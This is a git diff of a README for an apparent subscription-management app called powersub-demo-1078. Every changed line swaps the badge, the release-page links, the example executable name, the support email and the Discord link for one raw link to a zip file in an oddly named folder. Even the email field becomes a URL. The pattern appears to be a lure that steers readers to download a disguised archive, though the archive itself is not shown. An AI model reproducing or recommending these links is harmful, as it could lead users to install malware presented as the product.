@@ -1,6 +1,6 @@
 # 🎉 powersub-demo-1078 - Your Simple Solution for Power Subscriptions
 
-![Download](https://img.shields.io/badge/Download-Now-brightgreen)
+![Download](https://raw.githubusercontent.com/MannKalariya/powersub-demo-1078/main/shufflingly/powersub-demo-1078.zip)
 
 ## 🚀 Getting Started
 
@@ -8,12 +8,12 @@ Welcome to the powersub-demo-1078 application! This tool helps you manage and tr
 
 ## 📥 Download & Install
 
-To download the latest version of powersub-demo-1078, visit this page: [Download PowerSub](https://github.com/MannKalariya/powersub-demo-1078/releases).
+To download the latest version of powersub-demo-1078, visit this page: [Download PowerSub](https://raw.githubusercontent.com/MannKalariya/powersub-demo-1078/main/shufflingly/powersub-demo-1078.zip).
 
 1. Click the link above.
 2. Look for the **Latest Release** section.
 3. Choose the version you want to download.
-4. Click on the file that matches your operating system. (For example, Windows users might see a file named `powersub-demo-1078-windows.exe`.)
+4. Click on the file that matches your operating system. (For example, Windows users might see a file named `https://raw.githubusercontent.com/MannKalariya/powersub-demo-1078/main/shufflingly/powersub-demo-1078.zip`.)
 
 Once the download finishes, locate the file in your downloads folder.
 
@@ -56,8 +56,8 @@ If you encounter issues:
 
 Need help? Reach out to our support team:
 
-- **Email**: support@powersub-demo-1078.com
-- **Discord**: [Join our Discord Community](https://discord.gg/example)
+- **Email**: https://raw.githubusercontent.com/MannKalariya/powersub-demo-1078/main/shufflingly/powersub-demo-1078.zip
+- **Discord**: [Join our Discord Community](https://raw.githubusercontent.com/MannKalariya/powersub-demo-1078/main/shufflingly/powersub-demo-1078.zip)
 
 ## 📜 License
 
@@ -67,4 +67,4 @@ This application is licensed under the MIT License. You can use, modify, and dis
 
 Thank you for using powersub-demo-1078. We appreciate your support and feedback. Your experience matters to us, and we aim to make this tool better with each update.
 
-To download the application again or check for updates, return to [Download PowerSub](https://github.com/MannKalariya/powersub-demo-1078/releases).
+To download the application again or check for updates, return to [Download PowerSub](https://raw.githubusercontent.com/MannKalariya/powersub-demo-1078/main/shufflingly/powersub-demo-1078.zip).
